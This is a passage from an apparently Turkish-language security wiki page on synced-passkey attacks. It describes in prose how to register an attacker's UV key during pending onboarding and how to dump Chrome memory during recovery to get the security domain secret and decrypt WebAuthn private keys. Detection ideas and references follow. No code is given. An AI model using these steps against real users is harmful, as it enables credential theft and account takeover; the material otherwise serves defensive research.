- Onboarding cihazı **`uv_key_pending`** durumunda bırakırsa, saldırganın kontrolündeki bir UV public key kaydedin.
- Provider yeni UV key için attestation / secure-hardware origin doğrulaması yapmıyorsa, saldırgan key'inden gelen sonraki imzalar **`UV=1`** olarak değerlendirilir.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Chrome'un synced-passkey master secret'ı çekmesini sağlamak için recovery veya rejoin işlemini zorlayın.
- `passkey_enclave_state` öğesinin yeniden oluşturulmasını/değiştirilmesini izleyin, ardından plaintext **security domain secret (SDS)** bellekte bulunduğu sırada Chrome memory dump alın.
- Kurtarılan SDS'yi her `WebauthnCredentialSpecifics` kaydındaki şifrelenmiş alanların şifresini çözmek ve taşınabilir WebAuthn private key'leri kurtarmak için kullanın.

### DFIR / tespit fikirleri

- **`passkey_enclave_state` silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
- Tarayıcı dışındaki process'lerin Chrome **`Sync Data\LevelDB`** öğesine anormal erişimleri için alert oluşturun.
- **Chrome memory dump'ları** veya şüpheli cross-process memory access için alert oluşturun.
- Tekrarlanan **Google Password Manager recovery PIN** prompt'larını veya beklenmeyen yeniden onboarding işlemlerini inceleyin.
- Synced passkey'lerde WebAuthn **`signCount`** değerinin çoğu zaman kullanışlı olmadığını, sabit kalabileceğini ve bu nedenle klasik clone detection'ın zayıf olduğunu unutmayın.

## References

- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan ve Yıllarca Tespit Edilmeyen Operasyonlar Üzerine Bir İnceleme](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer credential decryption → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon'ın İçinde: Relay Network'ü ve Gizli Offensive Operation'ın İç İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Passkey'i Geçmek: Passwordless Authentication'da Yeni Bir Attack Surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows Hacking: Microsoft Sistemleri ve Network'lerine Yönelik Saldırılar](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store Gerçekte Nasıl Çalışır: NTDS.dit'in İçinde (Bölüm 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho, Still Toolkit ile Cyber-Espionage Arsenal'ını Genişletiyor](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW function ve `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – aktif oturumları sonlandırma](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
